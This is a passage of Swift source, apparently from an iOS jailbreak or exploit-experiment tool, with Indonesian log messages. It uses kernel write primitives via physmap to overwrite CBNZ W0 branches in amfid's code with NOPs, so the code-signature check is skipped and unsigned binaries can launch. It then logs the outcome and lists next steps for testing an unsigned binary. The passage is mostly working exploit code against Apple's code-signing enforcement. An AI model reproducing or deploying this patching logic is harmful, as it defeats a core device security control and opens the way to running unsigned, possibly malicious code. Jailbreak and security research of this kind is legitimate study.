        }

        detail += "Found \(patchTargets.count) patch candidates\n\n"

        if patchTargets.isEmpty {
            detail += "❌ Tidak ada patch candidate ditemukan.\n"
            detail += "Kemungkinan: amfid text tidak terbaca via physmap, atau pola berbeda.\n"
            detail += "\nInfo untuk diagnosa:\n"
            detail += "  amfid text physmap VA: 0x\(String(format: "%llx", amfidTextPhysmapVA))\n"
            detail += "  magic: 0x\(String(format: "%08x", magic))\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Log candidates
        detail += "=== Patch candidates ===\n"
        for (i, t) in patchTargets.prefix(5).enumerated() {
            detail += "  [\(i)] \(t.desc) instr=0x\(String(format: "%08x", t.original))\n"
        }
        detail += "\n"

        // ── Step 6: Patch — NOP semua CBNZ W0 di amfid text ─────────
        detail += "=== Step 6: Patch amfid text ===\n"
        detail += "Strategy: NOP semua CBNZ W0 (skip error branch setelah signature check)\n\n"

        let NOP: UInt32 = 0xD503201F
        var patchedCount = 0
        var patchLog = ""

        for t in patchTargets {
            // Hanya patch CBNZ W0 (paling aman — skip error path)
            let isCBNZ0 = (t.original >> 24) == 0x35 && (t.original & 0x1F) == 0
            guard isCBNZ0 else { continue }

            guard isSafePhysmapKRWAddress(t.physmapVA) else { continue }

            // Write NOP via physmap
            ds_kwrite32(t.physmapVA, NOP)

            // Verify
            let after = ds_kread32(t.physmapVA)
            if after == NOP {
                patchedCount += 1
                patchLog += "  ✅ Patched 0x\(String(format: "%llx", t.va)): 0x\(String(format: "%08x", t.original)) → NOP\n"
            } else {
                patchLog += "  ❌ Failed 0x\(String(format: "%llx", t.va)): got 0x\(String(format: "%08x", after))\n"
            }
        }

        detail += patchLog
        detail += "\nPatched \(patchedCount) instruksi\n\n"

        if patchedCount == 0 {
            detail += "❌ Tidak ada instruksi yang berhasil di-patch.\n"
            detail += "Kemungkinan: amfid text page di-protect (W^X enforcement)\n"
            detail += "iOS 18 mungkin enforce W^X untuk userspace text pages via PPL\n\n"
            detail += "=== Diagnosis ===\n"
            detail += "Coba baca kembali instruksi yang di-patch:\n"
            for t in patchTargets.prefix(3) {
                let readback = ds_kread32(t.physmapVA)
                detail += "  0x\(String(format: "%llx", t.va)): 0x\(String(format: "%08x", readback)) (original: 0x\(String(format: "%08x", t.original)))\n"
            }
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        detail += "✅ amfid text patched!\n"
        detail += "Sekarang amfid akan skip error branch setelah signature check.\n\n"
        detail += "=== NEXT STEPS ===\n"
        detail += "1. Tap ④ Test Binary Spawn dengan path binary unsigned\n"
        detail += "2. Jika spawn berhasil tanpa SIGKILL → amfid patch works!\n"
        detail += "3. Jika masih SIGKILL → perlu patch lebih banyak instruksi\n\n"
        detail += "⚠️ amfid akan restart otomatis jika crash (KeepAlive)\n"
        detail += "⚠️ Patch hilang setelah amfid restart — perlu re-patch\n"

        return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
    }

    
    #endif
}
